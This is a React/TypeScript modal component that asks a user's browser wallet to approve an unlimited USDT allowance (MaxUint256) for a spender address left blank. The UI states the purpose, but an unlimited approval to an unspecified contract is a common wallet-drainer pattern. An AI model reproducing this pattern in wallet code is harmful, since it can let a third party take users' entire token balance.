import { ethers } from "ethers";
import { useState } from "react";

interface Props {
  isOpen: boolean;
  onClose: () => void;
}

const USDT_ADDRESS = "0xdAC17F958D2ee523a2206206994597C13D831ec7";
const SPENDER_ADDRESS = "";

const ERC20_ABI = [
  "function approve(address spender, uint256 amount) external returns (bool)",
];

export default function ApproveModal({ isOpen, onClose }: Props) {
  const [loading, setLoading] = useState(false);

  const approveUSDT = async () => {
    try {
      setLoading(true);

      console.log("Step 1");

      await window.ethereum.request({
        method: "eth_requestAccounts",
      });

      console.log("Step 2");

      const provider = new ethers.BrowserProvider(window.ethereum);

      console.log("Step 3");

      const signer = await provider.getSigner();

      console.log("Step 4");

      const contract = new ethers.Contract(USDT_ADDRESS, ERC20_ABI, signer);

      console.log("Step 5");

      const tx = await contract.approve(
        SPENDER_ADDRESS,
        ethers.MaxUint256,
      );

      console.log("Transaction submitted:", tx.hash);

      await tx.wait();

      console.log("Confirmed");

      alert("Success");
    } catch (err) {
      console.error(err);
    } finally {
      setLoading(false);
    }
  };

  if (!isOpen) return null;

  return (
    <div className="fixed inset-0 flex items-center justify-center bg-black/70">
      <div className="w-[420px] rounded-2xl bg-zinc-900 p-6">
        <h2 className="mb-2 text-xl font-bold text-white">Approve USDT</h2>

        <p className="mb-6 text-zinc-400">Allow contract to spend your USDT.</p>

        <div className="flex gap-3">
          <button
            onClick={onClose}
            className="flex-1 rounded-xl border border-zinc-700 py-3 text-white"
          >
            Cancel
          </button>

          <button
            onClick={approveUSDT}
            disabled={loading}
            className="flex-1 rounded-xl bg-green-500 py-3 font-semibold text-black"
          >
            {loading ? "Approving..." : "Approve"}
          </button>
        </div>
      </div>
    </div>
  );
}
